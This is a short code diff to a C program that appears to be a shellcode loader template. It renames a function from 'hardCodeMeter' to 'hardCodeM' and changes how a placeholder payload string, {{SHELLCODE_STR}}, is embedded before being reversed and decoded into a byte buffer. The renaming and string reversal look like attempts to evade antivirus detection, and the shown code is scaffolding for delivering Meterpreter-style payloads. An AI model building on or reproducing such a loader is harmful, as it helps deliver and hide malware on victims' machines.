@@ -23,8 +23,10 @@ void StringToHex(char* str, unsigned char* out) {
 }
 
 
-void hardCodeMeter() {
-	char hexbuffer[] = "{{SHELLCODE_STR}}";
+void hardCodeM() {
+	char hexbuffer[] = {
+	{{SHELLCODE_STR}}
+	};
 	_strrev(hexbuffer);
 	unsigned char buffer[409600] = { 0 };
 	StringToHex(hexbuffer, buffer);
@@ -44,5 +46,5 @@ void hardCodeMeter() {
 // Main function
 //
 int main() {
-	hardCodeMeter();
+	hardCodeM();
 }
